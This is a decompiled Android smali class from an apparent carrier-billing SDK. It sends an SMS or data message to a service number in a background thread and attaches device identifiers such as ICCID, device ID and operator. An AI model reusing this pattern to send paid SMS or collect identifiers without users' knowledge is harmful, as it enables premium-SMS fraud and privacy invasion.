.class public Lorg/hj201606/lib/PayActivity$SendSMS;
.super Ljava/lang/Thread;


# instance fields
.field final synthetic a:Lorg/hj201606/lib/PayActivity;

.field private b:Ljava/lang/String;

.field private c:Ljava/lang/String;

.field private d:Ljava/lang/String;

.field private e:Ljava/lang/String;


# direct methods
.method public constructor <init>(Lorg/hj201606/lib/PayActivity;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V
    .locals 0

    iput-object p1, p0, Lorg/hj201606/lib/PayActivity$SendSMS;->a:Lorg/hj201606/lib/PayActivity;

    invoke-direct {p0}, Ljava/lang/Thread;-><init>()V

    iput-object p2, p0, Lorg/hj201606/lib/PayActivity$SendSMS;->b:Ljava/lang/String;

    iput-object p3, p0, Lorg/hj201606/lib/PayActivity$SendSMS;->c:Ljava/lang/String;

    iput-object p4, p0, Lorg/hj201606/lib/PayActivity$SendSMS;->d:Ljava/lang/String;

    iput-object p5, p0, Lorg/hj201606/lib/PayActivity$SendSMS;->e:Ljava/lang/String;

    return-void
.end method


# virtual methods
.method public run()V
    .locals 12

    const/4 v3, 0x0

    const/4 v2, 0x0

    invoke-super {p0}, Ljava/lang/Thread;->run()V

    sget-object v0, Ljava/lang/System;->out:Ljava/io/PrintStream;

    const-string v1, "______________________________send start______________________________"

    invoke-virtual {v0, v1}, Ljava/io/PrintStream;->println(Ljava/lang/String;)V

    invoke-static {}, Landroid/telephony/SmsManager;->getDefault()Landroid/telephony/SmsManager;

    move-result-object v0

    new-instance v4, Landroid/content/Intent;

    const-string v1, "SENT_SMS_ACTION_HEJU"

    invoke-direct {v4, v1}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    const-string v1, "singleAmount"

    iget-object v5, p0, Lorg/hj201606/lib/PayActivity$SendSMS;->e:Ljava/lang/String;

    invoke-virtual {v4, v1, v5}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    const-string v1, "tradeId"

    sget-object v5, Lorg/hj201606/lib/HejuInstance;->tradeId:Ljava/lang/String;

    invoke-virtual {v4, v1, v5}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    const-string v1, "spnumber"

    iget-object v5, p0, Lorg/hj201606/lib/PayActivity$SendSMS;->b:Ljava/lang/String;

    invoke-virtual {v4, v1, v5}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    const-string v1, "msg"

    iget-object v5, p0, Lorg/hj201606/lib/PayActivity$SendSMS;->c:Ljava/lang/String;

    invoke-virtual {v4, v1, v5}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    const-string v5, "did"

    sget-object v1, Lorg/hj201606/lib/sms/HuafeiConfigs;->phoneStatus:Ljava/util/HashMap;

    const-string v6, "Did"

    invoke-virtual {v1, v6}, Ljava/util/HashMap;->get(Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Ljava/lang/String;

    invoke-virtual {v4, v5, v1}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    const-string v5, "iccid"

    sget-object v1, Lorg/hj201606/lib/sms/HuafeiConfigs;->phoneStatus:Ljava/util/HashMap;

    const-string v6, "iccid"

    invoke-virtual {v1, v6}, Ljava/util/HashMap;->get(Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Ljava/lang/String;

    invoke-virtual {v4, v5, v1}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    const-string v5, "apiKey"

    sget-object v1, Lorg/hj201606/lib/sms/HuafeiConfigs;->phoneStatus:Ljava/util/HashMap;

    const-string v6, "hKey"

    invoke-virtual {v1, v6}, Ljava/util/HashMap;->get(Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Ljava/lang/String;

    invoke-virtual {v4, v5, v1}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    const-string v5, "model"

    sget-object v1, Lorg/hj201606/lib/sms/HuafeiConfigs;->phoneStatus:Ljava/util/HashMap;

    const-string v6, "Model"

    invoke-virtual {v1, v6}, Ljava/util/HashMap;->get(Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Ljava/lang/String;

    invoke-virtual {v4, v5, v1}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    const-string v5, "op"

    sget-object v1, Lorg/hj201606/lib/sms/HuafeiConfigs;->phoneStatus:Ljava/util/HashMap;

    const-string v6, "OP"

    invoke-virtual {v1, v6}, Ljava/util/HashMap;->get(Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Ljava/lang/String;

    invoke-virtual {v4, v5, v1}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    const-string v5, "os"

    sget-object v1, Lorg/hj201606/lib/sms/HuafeiConfigs;->phoneStatus:Ljava/util/HashMap;

    const-string v6, "OS"

    invoke-virtual {v1, v6}, Ljava/util/HashMap;->get(Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Ljava/lang/String;

    invoke-virtual {v4, v5, v1}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    const-string v5, "net"

    sget-object v1, Lorg/hj201606/lib/sms/HuafeiConfigs;->phoneStatus:Ljava/util/HashMap;

    const-string v6, "net"

    invoke-virtual {v1, v6}, Ljava/util/HashMap;->get(Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Ljava/lang/String;

    invoke-virtual {v4, v5, v1}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    const-string v1, "vcode"

    sget-object v5, Lorg/hj201606/lib/sms/HuafeiConfigs;->vcode:Ljava/lang/String;

    invoke-virtual {v4, v1, v5}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    const-string v5, "packageName"

    sget-object v1, Lorg/hj201606/lib/sms/HuafeiConfigs;->phoneStatus:Ljava/util/HashMap;

    const-string v6, "packageName"

    invoke-virtual {v1, v6}, Ljava/util/HashMap;->get(Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Ljava/lang/String;

    invoke-virtual {v4, v5, v1}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    iget-object v1, p0, Lorg/hj201606/lib/PayActivity$SendSMS;->a:Lorg/hj201606/lib/PayActivity;

    const/high16 v5, 0x8000000

    invoke-static {v1, v3, v4, v5}, Landroid/app/PendingIntent;->getBroadcast(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;

    move-result-object v5

    iget-object v1, p0, Lorg/hj201606/lib/PayActivity$SendSMS;->d:Ljava/lang/String;

    const-string v4, "sendDataMessage"

    invoke-virtual {v1, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_0

    iget-object v1, p0, Lorg/hj201606/lib/PayActivity$SendSMS;->c:Ljava/lang/String;

    invoke-static {v1, v3}, Landroid/util/Base64;->decode(Ljava/lang/String;I)[B

    move-result-object v4

    iget-object v1, p0, Lorg/hj201606/lib/PayActivity$SendSMS;->b:Ljava/lang/String;

    move-object v6, v2

    invoke-virtual/range {v0 .. v6}, Landroid/telephony/SmsManager;->sendDataMessage(Ljava/lang/String;Ljava/lang/String;S[BLandroid/app/PendingIntent;Landroid/app/PendingIntent;)V

    :goto_0
    sget-object v0, Ljava/lang/System;->out:Ljava/io/PrintStream;

    const-string v1, "______________________________send ok______________________________"

    invoke-virtual {v0, v1}, Ljava/io/PrintStream;->println(Ljava/lang/String;)V

    return-void

    :cond_0
    iget-object v1, p0, Lorg/hj201606/lib/PayActivity$SendSMS;->d:Ljava/lang/String;

    const-string v4, "sendByteMessage"

    invoke-virtual {v1, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_1

    iget-object v1, p0, Lorg/hj201606/lib/PayActivity$SendSMS;->b:Ljava/lang/String;

    iget-object v4, p0, Lorg/hj201606/lib/PayActivity$SendSMS;->c:Ljava/lang/String;

    invoke-virtual {v4}, Ljava/lang/String;->getBytes()[B

    move-result-object v4

    move-object v6, v2

    invoke-virtual/range {v0 .. v6}, Landroid/telephony/SmsManager;->sendDataMessage(Ljava/lang/String;Ljava/lang/String;S[BLandroid/app/PendingIntent;Landroid/app/PendingIntent;)V

    goto :goto_0

    :cond_1
    iget-object v7, p0, Lorg/hj201606/lib/PayActivity$SendSMS;->b:Ljava/lang/String;

    iget-object v9, p0, Lorg/hj201606/lib/PayActivity$SendSMS;->c:Ljava/lang/String;

    move-object v6, v0

    move-object v8, v2

    move-object v10, v5

    move-object v11, v2

    invoke-virtual/range {v6 .. v11}, Landroid/telephony/SmsManager;->sendTextMessage(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Landroid/app/PendingIntent;Landroid/app/PendingIntent;)V

    goto :goto_0
.end method
